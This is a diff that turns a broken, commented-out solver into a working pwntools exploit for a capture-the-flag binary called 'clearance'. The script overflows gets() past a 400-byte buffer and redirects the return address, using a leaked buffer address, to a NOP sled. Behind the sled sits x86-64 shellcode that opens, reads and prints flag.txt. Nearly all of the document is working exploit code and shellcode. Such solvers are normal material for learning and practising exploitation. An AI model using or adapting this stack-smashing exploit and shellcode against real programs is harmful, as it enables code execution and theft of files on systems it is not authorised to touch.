@@ -1,62 +1,66 @@
-# from pwn import *
+#!/usr/bin/env python3
+# clearance: gets() overflow -> ret2stack
+# build: gcc -fno-stack-protector -z execstack -no-pie -o clearance chall.c
 
-# THE SOLVER IS STILL BROKEN, BUT I CAN'T BE BOTHERED TO FIX IT RN. SORRY :(
+from pwn import *
 
-# context.arch = 'amd64'
+context.arch = 'amd64'
+context.log_level = 'info'
 
-# def solve():
-#     binary = './clearance'
-#     p = process(binary)
+BIN = './clearance'
+OFFSET = 408  # 400-byte buffer + saved rbp
 
-#     shellcode = asm('''
-#         /* sys_open("flag.txt", O_RDONLY) */
-#         lea rdi, [rip + flag_str]
-#         xor rsi, rsi
-#         mov rax, 2
-#         syscall
+SHELLCODE = asm('''
+    lea rdi, [rip + flag]
+    xor rsi, rsi
+    mov rax, 2
+    syscall
 
-#         /* sys_read(fd, rsp, 100) */
-#         mov rdi, rax
-#         mov rsi, rsp
-#         mov rdx, 100
-#         xor rax, rax
-#         syscall
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 100
+    xor rax, rax
+    syscall
 
-#         /* sys_write(1, rsp, rax) */
-#         mov rdx, rax
-#         mov rdi, 1
-#         mov rsi, rsp
-#         mov rax, 1
-#         syscall
+    mov rdx, rax
+    mov rdi, 1
+    mov rsi, rsp
+    mov rax, 1
+    syscall
 
-#         /* sys_exit(0) */
-#         xor rdi, rdi
-#         mov rax, 60
-#         syscall
+    xor rdi, rdi
+    mov rax, 60
+    syscall
 
-#         flag_str:
-#             .string "flag.txt"
-#     ''')
+    flag:
+        .string "flag.txt"
+''')
 
-#     try:
-#         p.recvuntil(b"Request ID: ")
-#         buf_addr = int(p.recvline().strip(), 16)
-        
-#         offset = 408
-        
-#         payload = b"A" * offset
-#         payload += p64(buf_addr + offset + 8) 
-#         payload += b"\x90" * 64
-#         payload += shellcode
+# gets() stops at newline, payload must not contain one
+assert b'\n' not in SHELLCODE
 
-#         p.sendlineafter(b"Submit clearance request:", payload)
-        
-#         print(p.recvall(timeout=2).decode(errors='ignore'))
-        
-#     except EOFError:
-#         pass
-#     finally:
-#         p.close()
 
-# if __name__ == "__main__":
-#     solve()
+def solve():
+    p = process(BIN)
+
+    p.recvuntil(b'Request ID: ')
+    buf = int(p.recvline().strip(), 16)
+
+    sled = buf + OFFSET + 8  # nop sled starts right after the overwritten rip
+    log.info(f'buf: {hex(buf)}')
+    log.info(f'rip -> {hex(sled)}')
+
+    payload = flat(
+        b'A' * OFFSET,
+        p64(sled),
+        b'\x90' * 64,
+        SHELLCODE,
+    )
+
+    p.sendlineafter(b'Submit clearance request:', payload)
+    print(p.recvall(timeout=2).decode(errors='ignore'))
+    p.close()
+
+
+if __name__ == '__main__':
+    solve()
